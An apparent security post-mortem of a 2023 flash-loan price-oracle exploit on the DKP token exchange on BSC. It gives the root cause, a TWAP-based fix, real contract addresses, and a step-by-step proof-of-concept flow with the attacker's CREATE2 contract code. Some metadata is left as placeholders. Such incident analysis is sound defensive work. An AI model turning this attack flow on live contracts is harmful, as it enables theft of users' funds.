# DKP Token Exploit — exchange() Spot Price Oracle Manipulation

## Metadata
| Field | Value |
|---|---|
| Date | 2023-03-11 |
| Project | DKP Token Exchange |
| Chain | BSC |
| Loss | ~USDT (address unconfirmed) |
| Attacker | address unconfirmed |
| Attack TX | address unconfirmed (BSC block 26,284,131) |
| Vulnerable Contract | DKPExchange: 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 |
| Block | 26,284,131 |
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Vulnerability Type | Spot Price Oracle Manipulation in exchange() |

## Summary
The DKP exchange contract's `exchange()` function used the live ratio of USDT/DKP balances in the LP pair as the DKP price. The attacker flash-loaned 99.92% of the USDT from the pair, temporarily making DKP appear extremely cheap relative to USDT. A pre-calculated CREATE2 contract then called `exchange()` at the manipulated price, receiving a massive amount of DKP for only 100 USDT. The DKP was then swapped back to USDT for profit.

## Vulnerability Details
- **CWE-829**: `exchange()` read price directly from `USDT.balanceOf(pair) / DKP.balanceOf(pair)` — a spot value trivially manipulable within a flash loan transaction.

### On-Chain Source Code

Source: Bytecode Decompiled

```solidity
// File: DKP_decompiled.sol
    function exchange(uint256 amount) external {}  // ❌

// ...

    function getUsdtPrice() external view returns (uint256) {}  // ❌
```

## Attack Flow (from testExploit())
```solidity
// 1. deal(USDT, 800e18) for gas/fees
// 2. exchangeDKP():
//    flashAmount = USDT.balanceOf(Pair) * 9992 / 10000
//    Pair.swap(flashAmount, 0, this, abi.encode(flashAmount))
// 3. pancakeCall():
//    a. Pre-calculate CREATE2 address of ExchangeDKP
//    b. USDT.transfer(ExchangeDKP_address, 100e18)
//    c. new ExchangeDKP{salt: keccak256("salt")}()
//       → constructor: DKPExchange.exchange(100e18)
//          // price is now ~0 USDT per DKP (pair nearly empty)
//          // receives massive DKP
//       → DKP.transfer(msg.sender, balance)
//    d. Repay Pair: flashAmount * 10000/9975 + 1000
// 4. DKPToUSDT() — swap DKP profit back to USDT
```

## Interfaces from PoC
```solidity
interface IDKPExchange {
    function exchange(uint256 amount) external;
}
contract ExchangeDKP {
    constructor() {
        USDT.approve(address(DKPExchange), type(uint256).max);
        DKPExchange.exchange(100 * 1e18);
        DKP.transfer(msg.sender, DKP.balanceOf(address(this)));
    }
}
```

## Key Addresses
| Label | Address |
|---|---|
| DKP Token | 0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19 |
| USDT | 0x55d398326f99059fF775485246999027B3197955 |
| DKP/USDT Pair | 0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7 |
| DKPExchange | 0x89257A52Ad585Aacb1137fCc8abbD03a963B9683 |
| PancakeRouter | 0x10ED43C718714eb63d5aA57B78B54704E256024E |

## Root Cause
`exchange()` read the DKP/USDT ratio from the live LP pair balance — a single-block manipulable spot price with no TWAP or staleness protection.

## Fix
```solidity
function exchange(uint256 usdtAmount) external {
    // Use Chainlink or TWAP instead of spot:
    uint256 dkpPrice = twapOracle.consult(address(USDT), 1e18, address(DKP));
    uint256 dkpOut = usdtAmount * 1e18 / dkpPrice;
    USDT.transferFrom(msg.sender, address(this), usdtAmount);
    DKP.transfer(msg.sender, dkpOut);
}
```

## References
- BSC block 26,284,131 flash loan + CREATE2 oracle manipulation